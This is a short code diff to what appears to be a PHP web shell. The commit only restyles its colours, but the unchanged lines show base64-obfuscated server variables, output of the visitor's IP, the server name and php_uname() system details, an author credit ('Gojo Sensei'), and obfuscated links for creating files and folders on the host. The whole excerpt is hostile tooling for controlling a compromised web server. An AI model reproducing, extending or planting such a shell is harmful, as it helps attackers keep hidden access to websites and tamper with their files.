@@ -379,13 +379,13 @@ button, input:hover {
 
 @keyframes kedip {
     0% {
-        color: red;
+        color: #4200ac;
     }
     50% {
-        color: green;
+        color: #00ff00;
     }
     100% {
-        color: red;
+        color: #4200ac;
     }
 }
 
@@ -406,9 +406,9 @@ button, input:hover {
 </head>
 <body>
 <div class="table-responsive text-light" style="text-align: left;padding: 4px;border: 2px solid #4200ac;border-radius:5px;">
-        <li>Your IP : <span style="color: green;"><?php echo $_SERVER[base64_decode('UkVNT1RFX0FERFI=')]; ?></span></li>
-        <li>Server IP : <span style="color: green;"><?php echo $_SERVER[base64_decode('U0VSVkVSX05BTUU=')]; ?></span></li>
-        <li>Server : <span style="color: green;"><?php echo php_uname(); ?></span></li>
+        <li>Your IP : <span style="color: #00ff00;"><?php echo $_SERVER[base64_decode('UkVNT1RFX0FERFI=')]; ?></span></li>
+        <li>Server IP : <span style="color: #00ff00;"><?php echo $_SERVER[base64_decode('U0VSVkVSX05BTUU=')]; ?></span></li>
+        <li>Server : <span style="color: #00ff00;"><?php echo php_uname(); ?></span></li>
         <li>Made By : <span class="kedip">Gojo Sensei</span></li>
         <li><a href="?p=<?= ss($Jd) . base64_decode('JmE9') . Ss(base64_decode('bmV3RmlsZQ==')) ?>" class="ohct kedip-border">+ File</a> | <a href="?p=<?= Ss($Jd) . base64_decode('JmE9') . sS(base64_decode('bmV3RGly')) ?>" class="ohct kedip-border">+ Folder</a></li>
         <li>
